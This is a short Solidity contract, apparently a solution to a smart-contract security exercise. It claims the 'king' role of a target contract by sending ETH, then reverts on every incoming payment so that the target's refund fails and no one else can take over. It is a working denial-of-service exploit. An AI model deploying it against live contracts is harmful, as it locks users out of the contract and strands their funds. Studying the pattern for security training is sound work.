// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {

    address public kingContract;

    constructor (address _kingAddress){
        kingContract = _kingAddress;
    }

    function attack() external payable {
        (bool success, ) = kingContract.call{value: msg.value}("");
         require(success, "Failed to send ETH");
    }

    receive() external payable {
        revert("I refuse to accept ETH");
    }
}